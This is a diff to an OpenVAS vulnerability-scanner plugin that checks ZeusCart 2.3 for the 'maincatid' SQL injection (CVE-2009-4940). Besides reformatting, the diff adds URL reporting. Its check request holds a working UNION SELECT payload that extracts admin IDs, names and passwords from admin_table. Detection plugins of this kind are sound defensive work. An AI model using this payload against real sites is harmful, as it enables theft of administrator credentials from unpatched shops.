@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_zeuscart_sql_inj_vuln.nasl 5388 2017-02-21 15:13:30Z teissa $
+# $Id: gb_zeuscart_sql_inj_vuln.nasl 9043 2018-03-07 12:38:58Z cfischer $
 #
 # ZeusCart 'maincatid' Parameter SQL Injection Vulnerability
 #
@@ -24,42 +24,46 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = 'cpe:/a:zeuscart:zeuscart';
+CPE = "cpe:/a:zeuscart:zeuscart";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801240");
-  script_version("$Revision: 5388 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
+  script_version("$Revision: 9043 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-03-07 13:38:58 +0100 (Wed, 07 Mar 2018) $");
   script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
   script_cve_id("CVE-2009-4940");
   script_bugtraq_id(35151);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("ZeusCart 'maincatid' Parameter SQL Injection Vulnerability");
-  script_xref(name : "URL" , value : "http://inj3ct0r.com/exploits/5275");
-  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8829");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_zeuscart_detect.nasl");
-  script_mandatory_keys("zeuscart/installed");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("zeuscart/installed");
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to cause SQL Injection
+  script_xref(name:"URL", value:"http://inj3ct0r.com/exploits/5275");
+  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8829");
+
+  script_tag(name:"impact" , value:"Successful exploitation will allow attacker to cause SQL Injection
   attack and gain sensitive information.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "ZeusCart Version 2.3");
-  script_tag(name : "insight" , value : "The flaw is caused by improper validation of user-supplied input
+
+  script_tag(name:"affected", value:"ZeusCart Version 2.3");
+
+  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
   via the 'maincatid' parameter in a 'showmaincatlanding' action which allows
   attacker to manipulate SQL queries by injecting arbitrary SQL code.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
+
+  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
   since disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "The host is running ZeusCart and is prone to SQL injection
+
+  script_tag(name:"summary", value:"The host is running ZeusCart and is prone to SQL injection
   vulnerability.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -67,27 +71,22 @@ if(description)
   exit(0);
 }
 
-
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-if (!port = get_app_port(cpe:CPE)) exit(0);
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir = get_app_location(cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
-if (!dir = get_app_location(cpe:CPE, port:port)) exit(0);
-
-if (dir == "/") dir = "";
-
-## Try SQL injection and check the response to confirm vulnerability
 url = dir +"/?do=featured&action=showmaincatlanding&maincatid=-9999+union"+
      "+all+select+concat(0x4f70656e564153,0x3a,admin_id,0x3a,admin_name," +
      "0x3a,admin_password,0x3a,0x4f70656e564153)+from+admin_table--";
 
-if(http_vuln_check(port:port, url:url,
-                   pattern:'>OpenVAS:(.+):(.+):(.+):OpenVAS<'))
-{
-  security_message(port:port);
-  exit(0);
+if( http_vuln_check( port:port, url:url, pattern:'>OpenVAS:(.+):(.+):(.+):OpenVAS<' ) ) {
+  report = report_vuln_url( port:port, url:url );
+  security_message( port:port, data:report );
+  exit( 0 );
 }
 
-exit(99);
+exit( 99 );
